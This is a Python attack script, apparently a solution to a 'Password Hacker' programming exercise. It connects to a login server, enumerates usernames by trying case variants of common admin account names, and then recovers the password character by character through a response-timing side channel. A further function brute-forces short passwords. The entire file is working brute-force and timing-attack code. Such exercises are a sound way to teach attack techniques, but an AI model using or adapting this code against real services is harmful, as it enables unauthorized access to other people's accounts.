import socket
import sys
import itertools
import string
import json
import datetime

LOGIN = ['admin', 'Admin', 'admin1', 'admin2', 'admin3', 'user1', 'user2', 'root', 'default', 'new_user', 'some_user', 'new_admin', 'administrator', 'Administrator', 'superuser', 'super', 'su', 'alex', 'suser', 'rootuser', 'adminadmin', 'useruser', 'superadmin', 'username', 'username1']

def read_login(path='C:\h-project\sang_kaghaz_gheychi\jet\Password Hacker\logins.txt'):
    with open(path, 'r') as login_file:
        login = [i.replace('\n', '') for i in login_file]
    for j in login:
        yield j


def make_word_capital(word):
    a = [i for i in range(2)]
    b = list()
    for i in range(len(word)):
        a = [i for i in range(2)]
        b.append(a)
    for i in itertools.product(*b):
        yield i


def all_possible_word_case(word):
    word_list = []
    if not word.isnumeric():
        for i in make_word_capital(word):
            for j in range(len(i)):
                if not word[j].isnumeric():
                    if i[j] == 1:
                        word_split = list(word)
                        word_split[j] = word_split[j].upper()
                        word = ''.join(word_split)
                    else:
                        word_split = list(word)
                        word_split[j] = word_split[j].lower()
                        word = ''.join(word_split)
            yield word
    yield word


def read_pass_file(password):
    for possible_pass in password:
        for j in all_possible_word_case(possible_pass):
            yield json.dumps({"login": j, "password": ' '})


def generate_password_file(my_socket):
    for a in read_pass_file(LOGIN):
        my_socket.send(a.encode())
        password = my_socket.recv(1024).decode()
        password = json.loads(password)
        if password["result"] == "Wrong password!":
            login = json.loads(a)
            return login


exit = {'exit': True}


def find_password(my_socket):
    correct_pass_list = []
    login = generate_password_file(my_socket)
    login = login['login']
    while 'exit':
        for i in string.ascii_lowercase + string.ascii_uppercase + string.digits:
            pass_dict = json.dumps({"login": login, "password": ''.join(correct_pass_list) + i})
            start_time = datetime.datetime.now()
            my_socket.send(pass_dict.encode())
            password = json.loads(my_socket.recv(1024).decode())
            stop_time = datetime.datetime.now()
            delay_duration = stop_time - start_time
            # if password["result"] == "Exception happened during login":
            if delay_duration > datetime.timedelta(microseconds=100000):
                correct_pass_list.append(i)
            elif password["result"] == "Connection success!":
                # pass_dict = json.dumps({"login": login, "password": ''.join(correct_pass_list)})
                print(pass_dict)
                exit['exit'] = False
                return True


def generate_password(my_socket):
    c = list()
    for _ in range(1, 4):
        b = (string.ascii_lowercase + string.digits)
        c.append(b)
        for a in itertools.product(*c):
            my_socket.send(''.join(a).encode())
            password = my_socket.recv(1024).decode()
            if password == 'Connection success!':
                print(''.join(a))
                return True


my_socket = socket.socket()
arg = sys.argv
ip_address = arg[1]
port = arg[2]
# message = arg[3].encode()
address = (str(ip_address), int(port))
my_socket.connect(address)
# my_socket.send(message)
# received_message = my_socket.recv(1024)
# print(received_message.decode())
# generate_password(my_socket)
find_password(my_socket)
my_socket.close()
